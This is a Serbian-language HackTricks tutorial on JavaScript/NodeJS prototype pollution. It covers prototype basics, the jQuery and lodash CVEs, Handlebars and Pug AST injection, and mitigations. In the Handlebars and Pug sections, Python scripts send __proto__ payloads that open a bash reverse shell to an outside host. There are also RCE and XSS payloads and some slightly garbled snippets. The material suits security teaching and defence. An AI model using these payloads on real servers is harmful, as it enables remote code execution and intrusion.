# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Objekti u JavaScript-u <a href="#053a" id="053a"></a>

Objekti u JavaScript-u su suÅ¡tinski kolekcije parova kljuÄ-vrednost, poznate kao svojstva. Objekat se moÅ¾e kreirati koristeÄ‡i `Object.create` sa `null` kao argumentom kako bi se dobio prazan objekat. Ova metoda omoguÄ‡ava kreiranje objekta bez nasleÄ‘enih svojstava.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Prazan objekat je sliÄan praznom reÄniku, predstavljen kao `{}`.

### Funkcije i klase u JavaScript-u

U JavaScript-u, klase i funkcije su tesno povezane, pri Äemu funkcije Äesto sluÅ¾e kao konstruktori za klase. Uprkos nedostatku ugraÄ‘ene podrÅ¡ke za klase u JavaScript-u, konstruktori mogu emulirati ponaÅ¡anje klasa.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipovi u JavaScript-u

JavaScript omoguÄ‡ava izmenu, dodavanje ili brisanje atributa prototipa tokom izvrÅ¡avanja. Ova fleksibilnost omoguÄ‡ava dinamiÄko proÅ¡irenje funkcionalnosti klase.

Funkcije poput `toString` i `valueOf` mogu biti izmenjene kako bi se promenilo njihovo ponaÅ¡anje, Å¡to pokazuje prilagodljivu prirodu JavaScript-ovog sistema prototipa.

## NasleÄ‘ivanje

U programiranju zasnovanom na prototipovima, svojstva/metode se nasleÄ‘uju od objekata iz klasa. Ove klase se kreiraju dodavanjem svojstava/metoda ili instanci druge klase ili praznog objekta.

Treba napomenuti da kada se svojstvo doda objektu koji sluÅ¾i kao prototip za druge objekte (kao Å¡to je `myPersonObj`), nasleÄ‘ujuÄ‡i objekti dobijaju pristup ovom novom svojstvu. MeÄ‘utim, ovo svojstvo se ne prikazuje automatski osim ako se eksplicitno ne pozove.

## \_\_proto\_\_ zagaÄ‘enje <a href="#0d0a" id="0d0a"></a>

## IstraÅ¾ivanje zagaÄ‘enja prototipa u JavaScript-u

JavaScript objekti su definisani parovima kljuÄ-vrednost i nasleÄ‘uju JavaScript Object prototip. To znaÄi da izmena Object prototipa moÅ¾e uticati na sve objekte u okruÅ¾enju.

Hajde da koristimo drugi primer kako bismo ilustrovali:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Pristup prototipu objekta je moguÄ‡ preko:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Dodavanjem svojstava u prototip objekta, svaki JavaScript objekat Ä‡e naslediti ova nova svojstva:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototype pollution

Za scenario u kojem je koriÅ¡Ä‡enje `__proto__` ograniÄeno, izmena prototipa funkcije je alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Ovo utiÄe samo na objekte koji su kreirani iz konstruktora `Vehicle`, dajuÄ‡i im svojstva `beep`, `hasWheels`, `honk` i `isElectric`.

Dva naÄina za globalno uticanje na JavaScript objekte putem zagaÄ‘ivanja prototipa su:

1. ZagaÄ‘ivanje `Object.prototype` direktno:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. ZagaÄ‘ivanje prototipa konstruktora za Äesto koriÅ¡Ä‡enu strukturu:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Nakon ovih operacija, svaki JavaScript objekat moÅ¾e izvrÅ¡iti metode `goodbye` i `greet`.

## ZagaÄ‘ivanje drugih objekata

### Od klase do Object.prototype

U scenariju gde moÅ¾ete **zagaÄ‘ivati odreÄ‘eni objekat** i trebate **dopreti do `Object.prototype`**, moÅ¾ete ga pronaÄ‡i koristeÄ‡i sledeÄ‡i kod:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### ZagaÄ‘ivanje elemenata niza

Imajte na umu da, kao Å¡to moÅ¾ete zagaÄ‘ivati atribute objekata u JS-u, ako imate pristup zagaÄ‘ivanju niza, takoÄ‘e moÅ¾ete **zagaÄ‘ivati vrednosti niza** koje su dostupne **preko indeksa** (imajte na umu da ne moÅ¾ete prebrisati vrednosti, pa morate zagaÄ‘ivati indekse koji se na neki naÄin koriste, ali nisu upisani).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### ZagaÄ‘ivanje HTML elemenata

Prilikom generisanja HTML elementa putem JS-a moguÄ‡e je **prepisati** atribut **`innerHTML`** kako bi se omoguÄ‡ilo pisanje **proizvoljnog HTML koda**. [Ideja i primer iz ovog Älanka](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Primeri

### Osnovni primer

Do proto-poluacije dolazi zbog greÅ¡ke u aplikaciji koja omoguÄ‡ava prepisivanje svojstava na `Object.prototype`. To znaÄi da poÅ¡to se veÄ‡ina objekata izvodi iz `Object.prototype`

Najjednostavniji primer je dodavanje vrednosti **nedefinisanom atributu objekta** koji Ä‡e biti proveren, kao Å¡to je:
```javascript
if (user.admin) {
```
Ako atribut **`admin` nije definisan**, moguÄ‡e je zloupotrebiti PP i postaviti ga na True koristeÄ‡i neÅ¡to poput:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Mehanizam iza ovoga ukljuÄuje manipulaciju svojstvima tako da ako napadaÄ ima kontrolu nad odreÄ‘enim unosima, moÅ¾e izmeniti prototip svih objekata u aplikaciji. Ova manipulacija obiÄno ukljuÄuje postavljanje svojstva `__proto__`, koje je u JavaScriptu sinonim za direktnu izmenu prototipa objekta.

Uslovi pod kojima se ovaj napad moÅ¾e uspeÅ¡no izvrÅ¡iti, kako je navedeno u odreÄ‘enoj [studiji](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), ukljuÄuju:

- IzvoÄ‘enje rekurzivnog spajanja.
- Definisanje svojstava na osnovu putanje.
- Kloniranje objekata.


### Prebrisavanje funkcije
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto zagaÄ‘enje za RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Klijentsko zagaÄ‘enje prototipa za XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: Napad zagaÄ‘enjem prototipa putem jQuery $ .extend

[Za dalje detalje pogledajte ovaj Älanak](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
U jQuery-u, funkcija `$ .extend` moÅ¾e dovesti do zagaÄ‘enja prototipa ako se nepravilno koristi moguÄ‡nost dubokog kopiranja. Ova funkcija se Äesto koristi za kloniranje objekata ili spajanje svojstava iz podrazumevanog objekta. MeÄ‘utim, kada je pogreÅ¡no konfigurisana, svojstva namenjena novom objektu mogu biti dodeljena prototipu umesto toga. Na primer:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Ova ranjivost, identifikovana kao CVE-2019-11358, ilustruje kako duboka kopija moÅ¾e nenamerno izmeniti prototip, Å¡to moÅ¾e dovesti do potencijalnih sigurnosnih rizika, kao Å¡to je neovlaÅ¡Ä‡en pristup administratoru ako se proveravaju svojstva poput `isAdmin` bez odgovarajuÄ‡e provere postojanja.

### CVE-2018-3721, CVE-2019-10744: Napad na proto-poluiciju putem lodash-a

[Za dalje detalje pogledajte ovaj Älanak](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) se susreo sa sliÄnim ranjivostima proto-poluicije (CVE-2018-3721, CVE-2019-10744). Ovi problemi su reÅ¡eni u verziji 4.17.11.

### JoÅ¡ jedan tutorijal sa CVE-ovima

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### AST Proto-poluicija u NodeJS-u

NodeJS intenzivno koristi Apstraktne Sintaksne Stabla (AST) u JavaScript-u za funkcionalnosti poput template engine-a i TypeScript-a. Ova sekcija istraÅ¾uje ranjivosti vezane za proto-poluiciju u template engine-ima, posebno Handlebars-u i Pug-u.

#### Analiza ranjivosti Handlebars-a

Template engine Handlebars je podloÅ¾an napadu proto-poluicije. Ova ranjivost proizlazi iz odreÄ‘enih funkcija unutar fajla `javascript-compiler.js`. Na primer, funkcija `appendContent` konkatenira `pendingContent` ako je prisutan, dok funkcija `pushSource` resetuje `pendingContent` na `undefined` nakon dodavanja izvora.

##### Proces iskoriÅ¡Ä‡avanja

IskoriÅ¡Ä‡avanje se vrÅ¡i putem Apstraktnog Sintaksnog Stabla (AST) koje proizvodi Handlebars, sledeÄ‡i ove korake:

1. **Manipulacija Parser-a**: Prvo, parser, putem Ävora `NumberLiteral`, primorava vrednosti da budu numeriÄke. Proto-poluicija moÅ¾e zaobiÄ‡i ovo, omoguÄ‡avajuÄ‡i umetanje ne-numeriÄkih stringova.
2. **Obrada od strane Compiler-a**: Compiler moÅ¾e obraditi AST objekat ili string template-a. Ako je `input.type` jednako `Program`, ulaz se tretira kao pre-analiziran, Å¡to moÅ¾e biti iskoriÅ¡Ä‡eno.
3. **Umetanje koda**: Kroz manipulaciju `Object.prototype`, moÅ¾e se umetnuti proizvoljni kod u funkciju template-a, Å¡to moÅ¾e dovesti do izvrÅ¡avanja udaljenog koda.

Primer koji demonstrira iskoriÅ¡Ä‡avanje ranjivosti Handlebars-a:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Ovaj kod prikazuje kako napadaÄ moÅ¾e ubaciti proizvoljni kod u Handlebars Å¡ablon.

**Spoljni izvor**: PronaÄ‘en je problem vezan za zagaÄ‘enje prototipa u biblioteci 'flat', kako je detaljno opisano ovde: [Problem na GitHub-u](https://github.com/hughsk/flat/issues/105).

**Spoljni izvor**: [Problem vezan za zagaÄ‘enje prototipa u biblioteci 'flat'](https://github.com/hughsk/flat/issues/105)

Primer zloupotrebe zagaÄ‘enja prototipa u Python-u:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug ranjivost

Pug, joÅ¡ jedan template engine, suoÄava se sa sliÄnim rizikom od proto-tip pollution-a. Detaljne informacije su dostupne u diskusiji o [AST Injection u Pug-u](https://blog.p6.is/AST-Injection/#Pug).

Primer proto-tip pollution-a u Pug-u:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Preventivne mere

Da biste smanjili rizik od zagaÄ‘enja prototipa, mogu se primeniti sledeÄ‡e strategije:

1. **Nepromenljivost objekta**: `Object.prototype` moÅ¾e se uÄiniti nepromenljivim primenom `Object.freeze`.
2. **Validacija unosa**: JSON unosi trebaju biti rigorozno validirani prema Å¡emi aplikacije.
3. **Sigurne funkcije spajanja**: Treba izbegavati nesigurnu upotrebu rekurzivnih funkcija spajanja.
4. **Objekti bez prototipa**: Objekti bez svojstava prototipa mogu se kreirati pomoÄ‡u `Object.create(null)`.
5. **Upotreba mape**: Umesto `Object`, treba koristiti `Map` za skladiÅ¡tenje parova kljuÄ-vrednost.
6. **AÅ¾uriranje biblioteka**: Bezbednosni zakrpe mogu se ukljuÄiti redovnim aÅ¾uriranjem biblioteka.
7. **Linter i alati za statiÄku analizu**: Koristite alate poput ESLint-a sa odgovarajuÄ‡im dodacima za otkrivanje i spreÄavanje ranjivosti zagaÄ‘enja prototipa.
8. **Pregled koda**: Sprovesti temeljan pregled koda radi identifikacije i otklanjanja potencijalnih rizika povezanih sa zagaÄ‘enjem prototipa.
9. **Obuka o bezbednosti**: Edukujte programere o rizicima zagaÄ‘enja prototipa i najboljim praksama za pisanje sigurnog koda.
10. **PaÅ¾ljiva upotreba biblioteka**: Budite oprezni prilikom koriÅ¡Ä‡enja biblioteka treÄ‡ih strana. Procenite njihovu bezbednosnu postavku i pregledajte njihov kod, posebno one koji manipuliÅ¡u objektima.
11. **ZaÅ¡tita tokom izvrÅ¡avanja**: Koristite mehanizme zaÅ¡tite tokom izvrÅ¡avanja, poput koriÅ¡Ä‡enja npm paketa usmerenih na bezbednost koji mogu otkriti i spreÄiti napade zagaÄ‘enja prototipa.

## Reference

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
